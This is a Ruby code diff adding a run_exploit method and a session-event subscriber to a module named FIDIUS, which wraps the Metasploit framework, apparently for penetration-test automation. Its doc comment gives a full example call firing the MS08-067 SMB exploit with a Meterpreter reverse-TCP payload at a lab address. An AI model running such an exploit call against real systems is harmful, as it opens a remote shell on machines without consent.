@@ -39,6 +39,28 @@ module FIDIUS
         daemon.framework
       end
 
+      # Runs the exploit with the given name and the given opts.
+      #
+      # example usage: msf.run_exploit("windows/smb/ms08_067_netapi",
+      #   {"Payload" => "windows/meterpreter/reverse_tcp", "Options" =>
+      #   {"RHOST" => "192.168.56.101", "LHOST" => "192.168.56.1"}})
+      #
+      # @param [String]  exploit
+      # @param [Hash]  opts
+      # @return [Msf::Session] A Session got for this exploit.
+      def run_exploit(exploit, opts)
+        daemon.run_exploit(exploit, opts)
+      end
+
+      # Adds a subscriber for the session events. This is called e.g on
+      # session create.
+      #
+      # @param [TODO]  handler The methods on this object are called when an
+      #                   event occurres.
+      def add_session_subscriber(handler)
+        daemon.framework.events.add_session_subscriber(handler)
+      end
+
       # Returns the Metasploit framework DRb wrapper. Useful for debugging.
       #
       # @return [FIDIUS::MsfDRbD]  The DRb wrapper.
